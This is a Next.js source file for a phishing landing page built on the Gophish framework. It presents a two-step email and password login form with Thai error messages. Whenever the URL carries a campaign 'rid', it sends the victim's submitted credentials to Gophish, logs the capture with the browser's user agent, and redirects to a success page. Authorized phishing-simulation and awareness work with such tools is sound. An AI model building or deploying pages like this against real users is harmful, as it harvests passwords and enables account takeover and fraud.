'use client'

import { useState, useEffect } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import AuthLayout from '@/components/auth/AuthLayout';
import EmailPage from '@/components/auth/EmailPage';
import PasswordPage from '@/components/auth/PasswordPage';
import { sendToGophish, validateRid, logCredentialCapture, generateSuccessUrl } from '@/utils/gophish';

export default function AuthPage() {
  const [step, setStep] = useState('email');
  const [email, setEmail] = useState('');
  const [rid, setRid] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const searchParams = useSearchParams();
  const router = useRouter();
  
  useEffect(() => {
    // Get rid parameter from URL
    const ridParam = searchParams.get('rid');
    if (ridParam && validateRid(ridParam)) {
      setRid(ridParam);
      console.log('Gophish RID detected:', ridParam);
    } else if (ridParam) {
      console.warn('Invalid RID format:', ridParam);
    }
  }, [searchParams]);
  
  const handleEmailNext = (email) => {
    setEmail(email);
    setStep('password');
  };
  
  const handleBack = () => {
    setStep('email');
  };
  
  const handleSubmit = async (credentials) => {
    console.log('Login attempted with:', credentials);
    setIsLoading(true);
    
    try {
      // If we have a valid rid, send credentials to Gophish
      if (rid && validateRid(rid)) {
        const result = await sendToGophish(credentials, rid);
        console.log('Gophish response:', result);
        
        if (result.success) {
          // Log the capture event
          logCredentialCapture({
            email: credentials.email,
            rid: rid,
            userAgent: navigator.userAgent,
            ip: 'client-side' // Will be captured server-side
          });
          
          // Redirect to success page with rid parameter
          const successUrl = generateSuccessUrl(rid);
          router.push(successUrl);
        } else {
          console.error('Failed to capture credentials');
          alert('เกิดข้อผิดพลาดในการเข้าสู่ระบบ');
        }
      } else {
        // Normal login flow (no rid parameter or invalid rid)
        console.log('Normal login flow - no valid RID');
        alert('ล็อกอินด้วย: ' + credentials.email);
      }
    } catch (error) {
      console.error('Error in login process:', error);
      alert('เกิดข้อผิดพลาดในการเข้าสู่ระบบ');
    } finally {
      setIsLoading(false);
    }
  };
  
  return (
    <AuthLayout>
      {step === 'email' ? (
        <EmailPage onNext={handleEmailNext} />
      ) : (
        <PasswordPage 
          email={email} 
          onBack={handleBack} 
          onSubmit={handleSubmit}
          isLoading={isLoading}
        />
      )}
    </AuthLayout>
  );
} 